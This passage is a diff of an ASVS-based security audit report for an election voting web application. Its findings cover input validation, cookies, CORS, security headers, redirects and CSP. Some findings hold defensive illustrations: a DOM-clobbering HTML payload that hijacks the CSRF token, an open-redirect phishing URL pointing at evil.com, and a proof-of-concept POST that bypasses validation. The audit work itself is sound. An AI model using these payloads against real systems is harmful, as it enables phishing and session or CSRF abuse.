-Change these endpoints to POST methods and implement proper CSRF protection: @APP.post('/do-open/&lt;eid&gt;'); @asfquart.auth.require({R.committer}); @load_election; async def do_open_endpoint(election): # Validate CSRF token; ...; @APP.post('/do-close/&lt;eid&gt;'); @asfquart.auth.require({R.committer}); @load_election; async def do_close_endpoint(election): # Validate CSRF token; ...
+Add a State Transition Rules section documenting which operations are valid in which states and what cross-entity consistency is required.
 
 ---
 
-#### FINDING-139: No CORS Configuration Visible in Application Code
+#### FINDING-127: No documentation of per-user or global business logic limits
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Sections** | 2.1.3 |
+| **Files** | schema.md, TODO.md, create-election.py:67, election.py:169 |
+| **Source Reports** | 2.1.3.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The application documentation does not define any limits on per-user operations (maximum elections a user can create, maximum issues per election, maximum voters per election/issue, rate limiting on vote submissions, rate limiting on election creation) or global limits (maximum concurrent open elections, maximum total elections in the system, maximum title/description field lengths, maximum number of STV candidates, maximum number of STV seats, timeout for election open/close operations). The create-election.py validates STV seats as positive integer but has no upper bound. The election.py has no limits on issue count. Without documented limits, the application is vulnerable to resource exhaustion (creating thousands of issues/elections) and there's no reference for implementing rate limiting or quotas.
+
+**Remediation:**
+
+Create a business limits document that includes: Per-User limits (Max elections created: 50 configurable, Max concurrent open elections owned: 10), Per-Election limits (Max issues: 500, Max eligible voters: 10,000, Max STV candidates per issue: 50, Max STV seats: candidates - 1), and Global limits (Election title max length: 200 characters, Issue title max length: 200 characters, Issue description max length: 10,000 characters).
+
+---
+
+#### FINDING-128: Date validation checks format but not logical business constraints
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L1 |
-| **CWE** | CWE-942 |
-| **ASVS Sections** | 3.4.2 |
-| **Files** | v3/server/main.py:32-45, v3/server/pages.py:Application-wide |
-| **Source Reports** | 3.4.2.md |
-| **Related** | - | **Description:**
+| **CWE** | - |
+| **ASVS Sections** | 2.2.1 |
+| **Files** | v3/server/pages.py:88-110 |
+| **Source Reports** | 2.2.1.md |
+| **Related Findings** | - |
 
-The provided application code contains no visible CORS configuration — no Access-Control-Allow-Origin header is set on any response, no CORS middleware is registered, and no @app.after_request handler manages CORS headers. The api module is imported but not provided for review, meaning CORS handling for API endpoints cannot be verified. If the underlying asfquart framework does not provide CORS protection by default, the application may either not serve cross-origin requests at all (failing to serve legitimate API consumers), or if a CORS library is added later without proper configuration, it could expose sensitive election data to unauthorized origins.
+**Description:**
+
+The date validation in `_set_election_date()` only checks ISO format parsing, not business logic validity. Elections can be set with nonsensical dates (past dates, close before open, far future dates), confusing administrators and potentially breaking UI display logic. No validation is performed to ensure dates are in the future, that close_at is after open_at, or that dates are within a reasonable range.
 
 **Remediation:**
 
-Implement CORS header configuration in create_app() or via a dedicated middleware using an @app.after_request handler. Use a fixed allowlist of trusted origins (e.g., ALLOWED_ORIGINS = {'https://whimsy.apache.org', 'https://www.apache.org'}). Validate the Origin HTTP request header against this allowlist and only set Access-Control-Allow-Origin to the validated origin value. Include Vary: Origin header when dynamically setting CORS headers.
+Add business logic validation for dates. Check that dates are not in the past: `if dt < today: quart.abort(400, 'Date cannot be in the past')`. For close dates, verify they are after open dates: `if field == 'close_at': md = election.get_metadata(); if md.open_at: open_date = datetime.date.fromtimestamp(md.open_at); if dt <= open_date: quart.abort(400, 'Close date must be after open date')`
 
-#### FINDING-140: No X-Content-Type-Options: nosniff Header Set on HTTP Responses
+---
+
+#### FINDING-129: Client-side required field validation not replicated server-side
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L1 |
+| **CWE** | - |
+| **ASVS Sections** | 2.2.2 |
+| **Files** | v3/server/pages.py, v3/server/templates/manage.ezt:92 |
+| **Source Reports** | 2.2.2.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The HTML form uses client-side required attribute and JavaScript validation for issue title and other fields, but the server-side handler does NOT verify the field is non-empty. The client-side validation can be easily bypassed by submitting a POST request directly with empty values. This is a Type A gap where server-side required-field validation is absent. Proof of concept: POST /do-add-issue/1a2b3c4d5e with title=&description= bypasses client-side required attribute and creates an issue with empty title. Empty or whitespace-only titles can be stored, violating data quality expectations. The database NOT NULL constraint doesn't prevent empty strings.
+
+**Remediation:**
+
+Add server-side validation: async def do_add_issue_endpoint(election): form = edict(await quart.request.form); title = form.get('title', '').strip(); if not title: await flash_danger('Issue title is required.'); return quart.redirect(f'/manage/{election.eid}', code=303)
+
+---
+
+#### FINDING-130: do_vote_endpoint does not verify voter eligibility for each specific issue
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Sections** | 2.2.3 |
+| **Files** | v3/server/pages.py:372-407, v3/steve/election.py |
+| **Source Reports** | 2.2.3.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The do_vote_endpoint validates that the IID exists in the election's issue list, but does not explicitly verify that the authenticated user (PID) is eligible to vote on that specific issue (has a mayvote entry for it) before calling add_vote. While add_vote does check mayvote, if the entry is None it results in an AttributeError rather than explicit authorization denial. This is accidental error handling rather than explicit validation.
+
+**Remediation:**
+
+Add explicit mayvote NULL check in add_vote() method. If mayvote is None, raise a clear VoterNotEligible exception rather than allowing AttributeError. This provides clear error handling and distinguishes authorization failures from system errors in logs.
+
+---
+
+#### FINDING-131: No validation that STV vote rankings reference valid candidates from issue's labelmap
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Sections** | 2.2.3 |
+| **Files** | v3/steve/election.py:231-244 |
+| **Source Reports** | 2.2.3.md |
+| **Related Findings** | - |
+
+**Description:**
+
+For STV issues, the votestring should contain a ranking of candidates whose labels exist in the issue's kv.labelmap. This combined data consistency (vote references valid candidates from the issue's metadata) is not validated. The add_vote() method does not check that votestring candidates are in issue.kv.labelmap, that ranking count is valid, or that there are no duplicate candidates in ranking. Invalid candidate references would corrupt STV tallying results or cause tally errors.
+
+**Remediation:**
+
+Validate that each ranked candidate label exists in the issue's kv.labelmap and there are no duplicates. Check that the ranking count does not exceed the number of candidates. Implement this validation before storing the encrypted vote.
+
+---
+
+#### FINDING-132: Missing browser security feature documentation
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L3 |
+| **CWE** | - |
+| **ASVS Sections** | 3.1.1 |
+| **Files** | Application-wide (no documentation file present), config.yaml.example, header.ezt |
+| **Source Reports** | 3.1.1.md |
+| **Related Findings** | - |
+
+**Description:**
+
+No application documentation exists specifying the expected browser security features (HTTPS, HSTS, CSP, X-Content-Type-Options, etc.) or defining application behavior when these features are unavailable. The config.yaml.example configures TLS certificates but there is no documentation or code that: 1) Specifies that browsers MUST support HTTPS, 2) Defines HSTS requirements, 3) Specifies Content-Security-Policy requirements, 4) Defines behavior when security features are absent (e.g., blocking HTTP access, warning users), 5) Specifies minimum browser version requirements. The header.ezt template contains no &lt;meta&gt; CSP tags and no JavaScript feature detection.
+
+**Remediation:**
+
+1. Create a security documentation file (e.g., SECURITY.md) specifying: Required: HTTPS, HSTS (max-age≥31536000), CSP with script-src restrictions; Required: X-Content-Type-Options: nosniff, X-Frame-Options or frame-ancestors; Behavior: HTTP requests must redirect to HTTPS; unsupported browsers receive a warning page. 2. Implement corresponding middleware in the application.
+
+---
+
+#### FINDING-133: DOM Clobbering via Global Scope Variables and Unsanitized HTML
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L3 |
+| **CWE** | CWE-79 |
+| **ASVS Sections** | 3.2.3 |
+| **Files** | v3/server/templates/manage.ezt:JavaScript blocks, v3/server/templates/manage-stv.ezt:JavaScript blocks |
+| **Source Reports** | 3.2.3.md |
+| **Related Findings** | FINDING-029, FINDING-118, FINDING-119 |
+
+**Description:**
+
+The `manage.ezt` and `manage-stv.ezt` templates declare JavaScript variables in the global scope (not wrapped in an IIFE or module). The variables `openModal`, `closeModal`, `csrfToken`, etc. are global. Additionally, `document.getElementById()` is used extensively to access elements, and the issue descriptions (rendered as raw HTML) could potentially introduce elements with crafted `id` attributes. An admin creates an issue with description containing `<form id="csrf-token"><input name="value" value="attacker-controlled"></form>`. When rendered, `document.getElementById('csrf-token')` would resolve to this injected element, and `.value` would access the form's `value` named element, potentially redirecting the CSRF token to an attacker value.
+
+**Remediation:**
+
+1. Wrap all page-level JavaScript in IIFEs: `(function() { 'use strict'; const csrfToken = document.getElementById('csrf-token').value; // ... rest of code })();` 2. Sanitize HTML in issue descriptions to prevent `id` and `name` attribute injection 3. Use more specific selectors that are harder to clobber: `const csrfToken = document.querySelector('input#csrf-token[type="hidden"]').value;`
+
+---
+
+#### FINDING-134: Session cookies lack __Host- prefix
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Sections** | 3.3.3 |
+| **Files** | v3/server/main.py:38, v3/server/pages.py:72 |
+| **Source Reports** | 3.3.3.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The application uses session cookies managed by the `asfquart` framework (via `asfquart.session.read()`), but there is no visible configuration anywhere in the provided code that sets the `__Host-` prefix for the session cookie name. Without the `__Host-` prefix, the session cookie could potentially be: set by a subdomain attacker (cookie tossing), transmitted over unencrypted connections, or scoped to a different path than intended.
+
+**Remediation:**
+
+Configure the session cookie name with the __Host- prefix in app configuration: `app.config['SESSION_COOKIE_NAME'] = '__Host-steve_session'`. Note that __Host- prefix requires Secure=True, Path=/, and no Domain attribute, which are automatically enforced by compliant browsers when __Host- is used.
+
+#### FINDING-135: Session cookie HttpOnly attribute not explicitly configured
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L2 |
-| CWE | CWE-430 |
-| ASVS Sections | 3.4.4 |
-| Files | v3/server/main.py (Application-wide), v3/server/pages.py (Application-wide) |
-| Source Reports | 3.4.4.md |
-| Related Findings | | **Description:**
+| CWE | |
+| ASVS sections | 3.3.4 |
+| Files | v3/server/main.py:38, v3/server/pages.py:60-90 |
+| Source Reports | 3.3.4.md |
+| Related | |
 
-All HTTP responses lack the 'X-Content-Type-Options: nosniff' header field. Client requests to endpoints such as `/static/<path:filename>` and `/docs/<iid>/<docname>` return content without this header. If a document with ambiguous content type is served (e.g., an uploaded file mistyped as `text/plain` but containing HTML/JavaScript), the browser's MIME sniffing could interpret it as executable content. This can lead to XSS via uploaded documents and weakens Cross-Origin Read Blocking (CORB) protection. This is particularly relevant for the `/docs/<iid>/<docname>` endpoint which serves user-referenced documents.
+**Description:**
+
+The session cookie configuration is not visible in the provided code. The application stores sensitive session data (uid, fullname, email) via `asfquart.session`, but there is no explicit `SESSION_COOKIE_HTTPONLY = True` configuration or equivalent. While the `asfquart`/Quart framework may default to HttpOnly, the absence of explicit configuration cannot be verified. Data flow: User authenticates via OAuth → session token stored in cookie → cookie potentially readable by client-side JavaScript if HttpOnly not set → XSS could steal session tokens. Without HttpOnly, session tokens could be exfiltrated via XSS attacks. Given the EZT template system lacks auto-escaping (noted in domain context) and the `flashes.ezt` template renders flash messages without explicit escaping, this is a heightened risk.
 
 **Remediation:**
 
-Implement a global after_request handler that sets the X-Content-Type-Options header on all responses:
-
+Explicitly configure session cookie attributes in application configuration:
 ```python
-@app.after_request
-async def set_security_headers(response):
-    response.headers['X-Content-Type-Options'] = 'nosniff'
+# Explicit configuration in create_app() or app config
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+# Or in Quart's response handling:
+app.config.update(
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SAMESITE='Lax',
+)
+```
+
+---
+
+#### FINDING-136: No CORS configuration is visible in the application code
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | |
+| ASVS sections | 3.4.2 |
+| Files | v3/server/main.py:entire file, v3/server/pages.py:entire file |
+| Source Reports | 3.4.2.md |
+| Related | |
+
+**Description:**
+
+No CORS configuration is visible in the application code. While this may be intentional (no cross-origin API access needed), the ASVS requirement states that the CORS policy should be explicitly configured. The absence of CORS headers means the browser's same-origin policy applies by default, which is the most restrictive setting. However, without explicit verification, we cannot confirm that no other middleware (e.g., `asfquart` internals or the reverse proxy mentioned in config) adds permissive CORS headers.
+
+**Remediation:**
+
+Add explicit CORS header configuration:
+```python
+@APP.after_request
+async def add_cors_headers(response):
+    # Explicitly deny cross-origin access (or allowlist trusted origins)
+    # If CORS is not needed, ensure no Access-Control-Allow-Origin is set
+    # If needed for specific endpoints:
+    # response.headers['Access-Control-Allow-Origin'] = 'https://trusted.apache.org'
+    
+    # Remove any accidentally-set permissive CORS headers
+    response.headers.pop('Access-Control-Allow-Origin', None)
     return response
 ```
 
 ---
 
-#### FINDING-141: No Referrer-Policy Header Set on HTTP Responses
+#### FINDING-137: Missing Referrer-Policy header allows leakage of sensitive URL paths to third-party services
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
-| ASVS Level(s) | L2 |
-| CWE | CWE-200 |
-| ASVS Sections | 3.4.5 |
-| Files | v3/server/main.py (Application-wide), v3/server/pages.py (Application-wide) |
-| Source Reports | 3.4.5.md |
-| Related Findings | | **Description:**
+| ASVS Level(s) | L2, L3 |
+| CWE | |
+| ASVS sections | 3.4.5, 3.7.5 |
+| Files | v3/server/main.py:application-wide, v3/server/templates/header.ezt, v3/server/templates/footer.ezt, v3/server/templates/about.ezt |
+| Source Reports | 3.4.5.md, 3.7.5.md |
+| Related | |
 
-The application does not set a Referrer-Policy HTTP response header on any responses. When users navigate from pages containing election IDs (e.g., /vote-on/&lt;eid&gt;) to external links, the browser sends the full URL including sensitive election IDs in the Referer header to third-party services. This leads to leakage of election IDs (10-char hex), internal URL structure (paths like /manage/&lt;eid&gt;, /vote-on/&lt;eid&gt;), and potentially sensitive hostname information for internal deployments.
+**Description:**
+
+The application does not configure any HTTP security response headers. Without these headers, browsers cannot enforce security features, and there is no mechanism to detect when a browser ignores or doesn't support expected policies. Missing headers include: Content-Security-Policy (restricts script execution, blocks inline scripts, report-uri can detect violations), Strict-Transport-Security (enforces HTTPS, prevents downgrade attacks, browser must support), X-Content-Type-Options: nosniff (prevents MIME sniffing, browser feature enforcement), Permissions-Policy (restricts browser APIs, feature restriction/detection), and Content-Security-Policy-Report-Only (monitors policy violations, detects browsers not enforcing CSP). This results in no defense-in-depth via CSP for XSS prevention, no HSTS means browsers may downgrade to HTTP, no MIME type enforcement means potential content-type attacks, and no visibility into browser security feature support.
 
 **Remediation:**
 
-Implement a global after_request handler that sets the Referrer-Policy header on all responses. Use 'strict-origin-when-cross-origin' or 'no-referrer' for maximum protection:
+Add after_request handler in main.py create_app() function to set security headers on all responses. Include Content-Security-Policy with default-src 'self', script-src 'self', style-src 'self', img-src 'self' https://www.apache.org, frame-ancestors 'none', and report-uri /csp-report. Set Strict-Transport-Security to max-age=31536000; includeSubDomains. Add X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Permissions-Policy: camera=(), microphone=(), geolocation=(), and Referrer-Policy: strict-origin-when-cross-origin.
+
+---
+
+#### FINDING-138: Missing Cross-Origin-Opener-Policy header on HTML responses
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | |
+| ASVS sections | 3.4.8 |
+| Files | v3/server/main.py:application-wide, v3/server/pages.py:all HTML-rendering routes |
+| Source Reports | 3.4.8.md |
+| Related | |
+
+**Description:**
+
+No Cross-Origin-Opener-Policy header is set on any HTML response. This leaves the application vulnerable to attacks that abuse shared access to Window objects: (1) Tabnabbing - If a user opens a link from the application in a new tab (e.g., the external links in footer.ezt to apache.org), the opened page can manipulate window.opener to redirect the original page. (2) Frame counting - Cross-origin pages can count the number of frames/windows, leaking information about application state. The footer template includes target="_open_privacy_link" which opens new windows, creating opener references.
+
+**Remediation:**
+
+Add an after_request handler to set the Cross-Origin-Opener-Policy header on all HTML responses:
 
 ```python
 @app.after_request
 async def set_security_headers(response):
-    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+    if 'text/html' in response.content_type:
+        response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'
     return response
 ```
 
 ---
 
-#### FINDING-142: Missing Redirect Allowlist and Validation Mechanism
+#### FINDING-139: JSON Endpoints Lack Content-Type Enforcement
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | |
+| ASVS sections | 3.5.2 |
+| Files | v3/server/pages.py:88 |
+| Source Reports | 3.5.2.md |
+| Related | |
+
+**Description:**
+
+While get_json() typically requires Content-Type: application/json (which would trigger a CORS preflight), the manage.ezt template's JavaScript sends requests with explicit Content-Type: application/json header. However, if Quart's get_json() has a force=True option or falls back to parsing regardless of content-type, a request with text/plain (CORS-safelisted) could bypass preflight. The server does not explicitly validate the Content-Type header. Additionally, the client-side code sends CSRF token as custom header (X-CSRFToken), which WOULD trigger a CORS preflight, providing a form of protection — however the server never validates this header value, making it defense-in-depth only if the request format changes.
+
+**Remediation:**
+
+Explicitly verify Content-Type to ensure preflight was triggered. Example: In _set_election_date function, add a check: if request.content_type != 'application/json': quart.abort(415, 'Content-Type must be application/json'). This ensures the request format cannot be changed to bypass preflight checks.
+
+---
+
+#### FINDING-140: No Sec-Fetch-* Header Validation on Any Endpoint
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | |
+| ASVS sections | 3.5.3 |
+| Files | v3/server/pages.py:entire file |
+| Source Reports | 3.5.3.md |
+| Related | |
+
+**Description:**
+
+The application does not validate Sec-Fetch-Site, Sec-Fetch-Mode, Sec-Fetch-Dest, or Sec-Fetch-User headers on any endpoint. Modern browsers send these headers automatically and they cannot be forged by JavaScript. Validating them provides an additional layer of cross-origin protection. All state-changing endpoints should reject requests where Sec-Fetch-Site: cross-site or Sec-Fetch-Mode: no-cors. This is a missed opportunity for defense-in-depth. If Sec-Fetch headers were validated, even the GET endpoints would have some protection against cross-origin exploitation.
+
+**Remediation:**
+
+Implement a before_request middleware to validate Sec-Fetch headers. Reject cross-origin requests to sensitive endpoints by checking if Sec-Fetch-Site is 'cross-site' or 'none' for POST/PUT/DELETE/PATCH methods. For GET state-changing endpoints (until fixed), reject requests where Sec-Fetch-Dest is 'image', 'script', or 'style' to prevent resource embedding attacks.
+
+---
+
+#### FINDING-141: External Image Resource Loaded Without Integrity Verification
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3, L2 |
+| CWE | |
+| ASVS sections | 3.6.1, 3.4.3 |
+| Files | v3/server/templates/header.ezt:14 |
+| Source Reports | 3.6.1.md, 3.4.3.md |
+| Related | |
+
+**Description:**
+
+Browser loads page → fetches SVG from `https://www.apache.org` → no integrity verification → SVG rendered in page. If the external Apache CDN is compromised or DNS is hijacked, a malicious SVG could be served. SVG files can contain embedded JavaScript when loaded via `<object>` or `<embed>`, though `<img>` tags restrict script execution. However, a compromised SVG could still be modified for phishing (e.g., changing the logo to impersonate another entity). While `<img>`-loaded SVGs cannot execute scripts, this represents a dependency on an unverified external resource. A compromised or modified image could affect application trust perception. SRI is not supported on `<img>` tags by browsers, making this a design issue.
+
+**Remediation:**
+
+Option 1: Self-host the image (recommended) - `<img src="/static/images/feather.svg" alt="Logo" width="30" height="30" class="d-inline-block align-text-top">`. Option 2: Document the security decision for this specific resource, noting that img-loaded SVGs cannot execute scripts.
+
+---
+
+#### FINDING-142: OAuth Redirect URI Pattern May Be Susceptible to Open Redirect Without Allowlist Validation
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L2 |
-| CWE | CWE-601 |
-| ASVS Sections | 3.7.2 |
-| Files | v3/server/pages.py (353), v3/server/pages.py (420), v3/server/pages.py (437), v3/server/main.py (37) |
+| CWE | |
+| ASVS sections | 3.7.2 |
+| Files | v3/server/main.py:37-41, v3/server/templates/header.ezt:28, v3/server/templates/header.ezt:37 |
 | Source Reports | 3.7.2.md |
-| Related Findings | FINDING-143 | **Description:**
+| Related | |
 
-While all current redirects in the application are to internal paths, there is no defensive mechanism (allowlist, redirect validator, or middleware) that would prevent future code changes from introducing open redirects. The application lacks a centralized redirect validation control. Additionally, the OAuth flow in main.py hardcodes external redirects to oauth.apache.org, which is acceptable, but the pattern shows that external redirects are architecturally possible without validation. No user-controllable input flows into redirect targets in the current code. However, there is no safe_redirect() utility or allowlist that would catch regressions. The domain context explicitly mentions that 'any redirects to external domains show user warnings' — this control is absent.
+**Description:**
+
+User or attacker crafts URL → `/auth?login=https://evil.com` → framework processes login parameter → after authentication, redirects to attacker-controlled URL. An attacker sends a phishing link: `https://steve.example.org/auth?login=https://evil.com/steal-session`. If the `login=` parameter value is used as a post-authentication redirect without validation against an allowlist, the user will be redirected to the attacker's site after authenticating. Open redirect enabling phishing attacks. After legitimate authentication at `oauth.apache.org`, users could be redirected to attacker-controlled sites that mimic the application, potentially capturing credentials or session tokens. The `/auth` endpoint implementation is in the asfquart framework (not provided). This finding is based on the observable pattern that login/logout parameters accept path values, and no allowlist validation is visible in the provided code.
 
 **Remediation:**
 
-Implement a safe_redirect() utility with an allowlist of external domains:
-
-```python
-ALLOWED_EXTERNAL_DOMAINS = {'oauth.apache.org'}
-
-def safe_redirect(url, code=303):
-    """Only allow redirects to internal paths or allowlisted domains."""
-    from urllib.parse import urlparse
-    parsed = urlparse(url)
-    if parsed.scheme and parsed.netloc:
-        # External URL - check allowlist
-        if parsed.netloc not in ALLOWED_EXTERNAL_DOMAINS:
-            raise ValueError(f"Redirect to unauthorized domain: {parsed.netloc}")
-    return quart.redirect(url, code=code)
-```
-
-Replace all quart.redirect() calls with safe_redirect().
+In the auth handling (asfquart framework or custom middleware): Add an ALLOWED_REDIRECT_PATHS allowlist containing safe internal paths like {'/voter', '/admin', '/'}. Implement a validate_redirect function that ensures redirect target is a safe internal path by parsing the URL and rejecting any with scheme or netloc, or that don't start with '/'. Return a default safe redirect '/' if validation fails.
 
 ---
 
-#### FINDING-143: No User Notification When Redirecting to External OAuth Domain
+#### FINDING-143: External Links Navigate Without User Notification or Cancellation Option
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L3 |
-| CWE | CWE-601 |
-| ASVS Sections | 3.7.3 |
-| Files | v3/server/main.py (37), v3/server/pages.py (Application-wide) |
+| CWE | |
+| ASVS sections | 3.7.3 |
+| Files | v3/server/templates/footer.ezt:8-12, v3/server/templates/home.ezt:46-49, v3/server/templates/about.ezt:7 |
 | Source Reports | 3.7.3.md |
-| Related Findings | FINDING-142 | **Description:**
+| Related | |
 
-The application does not implement any user notification or interstitial page when redirecting to external domains. While current application redirects are all internal, the OAuth flow redirects users to `oauth.apache.org` without displaying a notification that they are leaving the application. The domain context explicitly requires: 'any redirects to external domains show user warnings.' The OAuth authentication flow (managed by `asfquart.generics`) redirects users to `https://oauth.apache.org/auth?state=%s&redirect_uri=%s` without an interstitial page.
+**Description:**
+
+Users are navigated away from the authenticated application without notification. While these specific links go to trusted Apache-controlled domains, there is no architectural pattern in place to handle this for any future external links. This is a Level 3 requirement and the absence of the pattern means it cannot be verified. Data flow: User clicks external link → browser immediately navigates to https://www.apache.org/... or https://steve.apache.org/ → no interstitial warning → no cancel option
 
 **Remediation:**
 
-Implement an interstitial page that warns users before external redirects. Create a `/leaving` endpoint with template `leaving.ezt` that validates the target URL against an allowlist of external domains (e.g., oauth.apache.org), displays the target domain to the user, and provides options to proceed or cancel. Example implementation: create a `@APP.get('/leaving')` route that accepts a `target` parameter, validates it against `ALLOWED_EXTERNAL_DOMAINS`, and renders a template showing the destination domain with proceed/cancel options.
+Add an external redirect interstitial page with validation against allowlist of trusted domains. For untrusted domains, render an interstitial template with cancel option. Implement /external-link endpoint that validates target URLs against TRUSTED_DOMAINS allowlist and renders external_redirect.ezt template with Continue and Cancel buttons for non-trusted domains.
 
 ---
 
-#### FINDING-144: No Browser Security Feature Detection or Warning Mechanism
+#### FINDING-144: Inline JavaScript Without CSP Nonce/Hash Strategy
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L3 |
-| CWE | CWE-1104 |
-| ASVS Sections | 3.7.5 |
-| Files | v3/server/pages.py (Application-wide) |
+| CWE | |
+| ASVS sections | 3.7.5 |
+| Files | v3/server/templates/manage.ezt:all, v3/server/templates/admin.ezt:all, v3/server/templates/vote-on.ezt:all, v3/server/templates/manage-stv.ezt:all, v3/server/templates/voter.ezt:all, v3/server/pages.py:all |
 | Source Reports | 3.7.5.md |
-| Related Findings | | **Description:**
+| Related | |
 
-The application does not implement any mechanism to detect whether the user's browser supports expected security features (such as CSP, COOP, CORS, SameSite cookies, etc.) and does not warn the user or block access if these features are unavailable. There is no client-side JavaScript feature detection, no User-Agent analysis, and no server-side checks that would identify outdated browsers lacking critical security support. Users accessing the application with outdated browsers (e.g., IE11, older mobile browsers) that lack support for modern security features (CSP Level 3, SameSite cookies, COOP) would not be warned that their session may be vulnerable to attacks that the application's security architecture assumes are mitigated by browser enforcement.
+**Description:**
+
+Every interactive template contains substantial inline JavaScript. Without CSP headers and a nonce/hash strategy, if CSP were ever added, it would require 'unsafe-inline' which defeats the purpose. The current architecture makes it impossible to implement proper CSP-based browser security feature enforcement. Templates with inline scripts include: manage.ezt (~120 lines inline JS), manage-stv.ezt (~100 lines inline JS), vote-on.ezt (~200 lines inline JS), admin.ezt (~20 lines inline JS), and voter.ezt (~20 lines inline JS). This prevents implementation of strict CSP without 'unsafe-inline', means browsers cannot enforce script source restrictions, gives XSS attacks full access to page context, and prevents CSP violation reporting for these scripts.
 
 **Remediation:**
 
-Implement client-side JavaScript feature detection to check for required browser security capabilities (crypto.subtle, crossOriginIsolated, etc.) and display warnings to users with unsupported browsers. Add server-side User-Agent analysis using a before_request hook to block known-insecure browsers (MSIE, Trident/, Edge/12, Edge/13). Include browser compatibility check script in base template and utilize existing flash message infrastructure to display warnings. Example implementation: Create static/js/browser-check.js with feature detection logic checking for window.crypto, window.crypto.subtle, and other required features. Add @APP.before_request handler to check User-Agent header and return 400 response for insecure browser patterns.
+Generate a CSP nonce per request on the Python side (e.g., result.csp_nonce = secrets.token_hex(16)) and pass to templates. Add nonce attribute to all inline script tags in templates (e.g., &lt;script nonce="[csp_nonce]"&gt;). Update CSP header to include script-src 'self' 'nonce-{csp_nonce}'. Alternatively, refactor inline scripts into external .js files referenced by src attribute to eliminate need for nonces.
 
 ---
 
-#### FINDING-145: No TLS Version Configuration in Config Template
+#### FINDING-145: No Prerequisite Validation Before Election Opening
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🟡 Medium |
 | ASVS Level(s) | L1 |
-| CWE | |
-| ASVS Sections | 12.1.1 |
-| Files | v3/server/config.yaml.example (6-12) |
-| Source Reports | 12.1.1.md |
-| Related Findings | | **Description:**
-
-The configuration template provides no guidance or fields for specifying TLS protocol versions. Administrators deploying this application have no documented mechanism to enforce TLS 1.2+ or prefer TLS 1.3. The config.yaml.example only includes certfile and keyfile fields without any TLS protocol version settings.
-
-**Remediation:**
-
-Add TLS version configuration to the example config: server.certfile, server.keyfile, and server.min_tls_version: '1.2' with a comment indicating 'Minimum TLS version (1.2 or 1.3)'.
-
----
-
-#### FINDING-146: OCSP Stapling Not Configured for TLS Server
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L3 |
-| CWE | |
-| ASVS Sections | 12.1.4 |
-| Files | v3/server/main.py (75-82), v3/server/config.yaml.example |
-| Source Reports | 12.1.4.md |
-| Related Findings | | **Description:**
-
-No OCSP stapling is configured for the TLS server. If a server certificate is compromised and revoked, clients will not be efficiently informed of the revocation status. Without OCSP stapling: Clients must perform their own OCSP lookups (slower, privacy-leaking), many clients soft-fail OCSP checks meaning revoked certificates may still be accepted, and the development configuration uses self-signed certificates (where OCSP is not applicable), but production deployments need this.
-
-**Remediation:**
-
-For production deployment with Hypercorn, configure OCSP stapling in the SSL context using ssl.SSLContext with set_ocsp_client_callback. For Hypercorn-based deployment, add ssl configuration to hypercorn.toml with certfile and keyfile, and configure a reverse proxy (nginx/Apache) with OCSP stapling enabled. Implement periodic refresh of the OCSP response.
-
----
-
-#### FINDING-147: Self-Signed Certificates Used with No Pathway to Publicly Trusted Certificates for External-Facing Services
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟡 Medium |
-| ASVS Level(s) | L1 |
-| CWE | |
-| ASVS Sections | 12.2.2 |
-| Files | v3/server/config.yaml.example (25-31), v3/docs/quickstart.md (49-53) |
-| Source Reports | 12.2.2.md |
-| Related Findings | | **Description:**
-
-The example configuration and documentation exclusively reference self-signed certificates. While the architecture document mentions 'Typical usage is that a proxy sits in front of this server,' there is: 1. No production configuration example with publicly trusted certificates 2. No documentation on deploying with publicly trusted TLS certs 3. No validation that configured certificates are publicly trusted 4. The `certs/` directory structure implies certificate storage alongside code. External-facing clients (voters, administrators) connecting directly to this service would encounter certificate warnings or be vulnerable to MITM attacks if self-signed certificates are used in production.
-
-**Remediation:**
-
